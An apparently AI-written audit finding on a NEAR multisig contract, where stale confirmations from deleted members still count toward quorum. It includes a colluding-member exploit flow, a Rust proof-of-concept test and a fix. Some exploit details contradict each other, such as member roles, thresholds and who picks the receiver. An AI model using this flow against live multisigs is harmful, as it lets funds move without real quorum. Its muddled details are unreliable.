`delete_member` never purges a removed member's confirmation strings from requests they merely *confirmed* (only from ones they *originated*), letting a stale confirmation count toward `num_confirmations` and letting a request execute with fewer live confirming members than required - (File: `multisig2/src/lib.rs`)

*(Note: the header in the prompt cites `voting/src/lib.rs`, but that file contains only `VotingContract` (validator-stake voting) and has no `delete_member`, `MultiSigRequest`, or confirmation logic at all — [1](#0-0) . The described `MultiSigContract`/`delete_member`/`r.member == member` logic actually lives in `multisig2/src/lib.rs`, so the analysis below is scoped there.)*

### Summary
`MultiSigContract::delete_member` in `multisig2/src/lib.rs` removes a member's entry from `self.members` and deletes only the requests that member *originated* (`r.member == member`), but it never scans `self.confirmations` to strip that member's string out of confirmation sets on requests they had merely confirmed for someone else. Because `confirm` counts raw `HashSet<String>` length against `num_confirmations` with no liveness check against current `self.members`, a confirmation cast by a member who is later deleted still counts toward quorum, letting a request execute with fewer currently-live confirming members than `num_confirmations`.

### Finding Description
The broken binding: at the moment `execute_request` fires, the number of **distinct currently-live members** who confirmed a request should equal (or exceed) `num_confirmations`. Instead, the code enforces only `confirmations.len() + 1 >= num_confirmations`, where `confirmations` is a `HashSet<String>` [2](#0-1)  populated with `member.to_string()` values that are never invalidated when a member is deleted unless that member happened to be the *originator* of the request:

```rust
fn delete_member(&mut self, promise: Promise, member: MultisigMember) -> Promise {
    ...
    let request_ids: Vec<u32> = self
        .requests
        .iter()
        .filter_map(|(k, r)| if r.member == member { Some(k) } else { None })
        .collect();
    for request_id in request_ids {
        self.confirmations.remove(&request_id);
        self.requests.remove(&request_id);
    }
    ...
    self.members.remove(&member);
    ...
}
``` [3](#0-2) 

This filter only matches `MultiSigRequestWithSigner.member`, i.e. the request's *creator*, not any of the arbitrary strings stored inside other requests' `confirmations` sets. Any request originated by an honest member but *confirmed* by the member being deleted keeps its confirmations set fully intact, including the now-removed member's string.

`confirm` then trusts that stale count with no filtering against `self.members`:
```rust
pub fn confirm(&mut self, request_id: RequestId) -> PromiseOrValue<bool> {
    ...
    let mut confirmations = self.confirmations.get(&request_id).unwrap();
    assert(!confirmations.contains(&member.to_string()), "Already confirmed this request with this key");
    if confirmations.len() as u32 + 1 >= self.num_confirmations {
        let request = self.remove_request(request_id);
        self.execute_request(request)
    } else { ... }
}
``` [4](#0-3) 

**Exploit flow** (attacker colludes with member B, `members = {A, B, C, D}`, `num_confirmations = 2`):
1. Honest member A calls `add_request(Transfer{amount, receiver_id: attacker})` → `request_id = 0`, confirmations = `{}`.
2. Colluding member B calls `confirm(0)`: `0+1=1 >= 2` is false, so B's string is inserted: confirmations = `{"B"}`.
3. Any member (e.g. C) calls `add_request(DeleteMember{member: B})` → `request_id = 1`.
4. Two other live members (e.g. C, D) confirm request 1, reaching `num_confirmations=2`, executing `delete_member(promise, B)`. Since request 0 was authored by A (not B), it is untouched — `self.members` becomes `{A, C, D}`, but confirmations for request 0 still contain `"B"`.
5. Attacker-colluding member C now calls `confirm(0)`: `confirmations.len()=1 (+ "B") + 1 = 2 >= 2` → `execute_request` fires the `Transfer`, moving NEAR to the attacker with only **one** truly live confirming member (C) plus a ghost confirmation from an already-removed member (B), against a nominal 2-of-3 (post-deletion) threshold.

No existing guard prevents this: `assert_valid_request` only checks the *caller* is a current member [5](#0-4) , not that prior confirmers in the set are still current members; `delete_member`'s purge is scoped to originated requests only.

### Impact Explanation
NEAR is transferred out of the multisig contract account to a receiver chosen by the request's honest originator, but authorized on paper by a quorum that includes a confirmation from an already-deleted, no-longer-live member — i.e., a multisig request executes below the number of currently-live confirming members, matching the Critical category ("a multisig request executed below `num_confirmations` live members"). The attack is repeatable any time a member who has confirmed an outstanding request is later removed via `DeleteMember`, and scales to any `MultiSigContract` deployment using `multisig2`.

### Likelihood Explanation
This requires collusion between an attacker and at least one current multisig member (to leave a live confirmation, then get deleted) — i.e. the attacking party controls or colludes with a legitimate member's key, which is within the scope of "colluding member" scenarios implied by the question. No special deposit or balance is needed beyond having an outstanding unconfirmed request and a subsequent, unrelated `DeleteMember` request executing — both are normal, permitted multisig operations. The bug is deterministic and does not depend on race conditions or gas limits, only on the ordinary sequence of add_request/confirm/delete_member calls that any set of members can trigger.

### Recommendation
In `delete_member`, before removing the member from `self.members`, iterate over **all** `self.confirmations` entries (not just requests where `r.member == member`) and remove `member.to_string()` from each confirmation set. Alternatively, change `confirm`'s quorum check to intersect the stored confirmation strings with the *current* `self.members` set before comparing against `num_confirmations`, so stale confirmations from removed members never count toward quorum.

### Proof of Concept
```rust
#[test]
fn test_ghost_confirmation_after_delete_member() {
    // members = {alice, bob, keyA, keyB}; num_confirmations = 2
    testing_env!(context_with_account(alice(), 1_000));
    let mut c = MultiSigContract::new(members(), 2);

    // 1. Alice adds a Transfer request to "attacker"
    testing_env!(context_with_account(alice(), 1_000));
    let transfer_req_id = c.add_request(MultiSigRequest {
        receiver_id: attacker(),
        actions: vec![MultiSigRequestAction::Transfer { amount: 1_000.into() }],
    });

    // 2. Bob (colluding, later to be deleted) confirms it -> confirmations = {"bob"}
    testing_env!(context_with_account(bob(), 1_000));
    c.confirm(transfer_req_id);
    assert_eq!(c.confirmations.get(&transfer_req_id).unwrap().len(), 1);

    // 3. Someone adds+confirms DeleteMember{bob} to reach quorum (2 distinct live confirmers)
    testing_env!(context_with_account(alice(), 1_000));
    let delete_req_id = c.add_request(MultiSigRequest {
        receiver_id: alice(), // current_account_id in these tests
        actions: vec![MultiSigRequestAction::DeleteMember {
            member: MultisigMember::Account { account_id: bob() },
        }],
    });
    testing_env!(context_with_key(test_key_2(), 1_000)); // second live confirmer
    c.confirm(delete_req_id); // executes delete_member(bob)

    // Sanity: bob removed from live members
    assert!(!c.get_members().contains(&MultisigMember::Account { account_id: bob() }));

    // Ghost confirmation still present on transfer_req_id
    assert!(c.confirmations.get(&transfer_req_id).unwrap().contains(&bob().to_string()));

    // 4. A single additional live member confirms -> crosses quorum with only 1 truly live confirmer + 1 ghost
    testing_env!(context_with_key(test_key_1(), 1_000));
    let result = c.confirm(transfer_req_id); // should NOT execute, but does

    // Assert the transfer executed (request removed) despite only 1 live confirming member
    assert_eq!(c.requests.get(&transfer_req_id), None);
}
```
This test demonstrates the `Transfer` request executing via `execute_request` after quorum is reached using one live confirmation plus a stale "bob" string, even though `bob` is no longer in `self.members` at execution time.

    fn delete_member(&mut self, promise: Promise, member: MultisigMember) -> Promise {
        assert(
            self.members.len() - 1 >= self.num_confirmations as u64,
            "Removing given member will make total number of members below number of confirmations",
        );
        // delete outstanding requests by public_key
        let request_ids: Vec<u32> = self
            .requests
            .iter()
            .filter_map(|(k, r)| if r.member == member { Some(k) } else { None })
            .collect();
        for request_id in request_ids {
            // remove confirmations for this request
            self.confirmations.remove(&request_id);
            self.requests.remove(&request_id);
        }
        // remove num_requests_pk entry for member
        self.num_requests_pk.remove(&member.to_string());
        self.members.remove(&member);
        match member {
            MultisigMember::AccessKey { public_key } => promise.delete_key(public_key.into()),
            MultisigMember::Account { account_id: _ } => promise,
        }
    }
